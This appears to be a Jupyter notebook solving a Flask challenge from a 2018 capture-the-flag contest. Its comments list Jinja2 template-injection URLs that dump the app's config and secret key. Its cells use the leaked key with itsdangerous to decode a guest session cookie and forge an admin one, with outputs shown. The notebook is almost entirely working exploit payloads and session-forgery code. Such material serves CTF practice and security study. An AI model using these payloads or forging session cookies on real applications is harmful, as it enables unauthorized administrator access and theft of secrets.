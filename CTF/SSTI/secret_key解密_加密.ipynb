{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "#通过下面的SSTI获取secret_key\n",
    "#http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{self.__dict__}}\n",
    "#http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{url_for.__globals__['current_app'].__dict__['con'+'fig']}}\n",
    "#http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={{get_flashed_messages.__globals__['current_app'] .__dict__['con'+'fig']}}\n",
    "#解密secret_key（查看源码中的key）\n",
    "from itsdangerous import *\n",
    "s=URLSafeTimedSerializer('!955)aa1~2.7e2ad', salt=\"cookie-session\",signer_kwargs={\"key_derivation\":\"hmac\",\"digest_method\":\"sha1\"})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'username': 'guest'}"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s.loads(\"eyJ1c2VybmFtZSI6Imd1ZXN0In0.Dtb6oA.Q0keq86KcltXV9fQb_DysAhJ25Q\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'eyJ1c2VybmFtZSI6ImFkbWluIn0.Dtb7qg.KFmK10NoDHC53CFP5_BIgDqNNsA'"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s.dumps({'username': 'admin'})"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
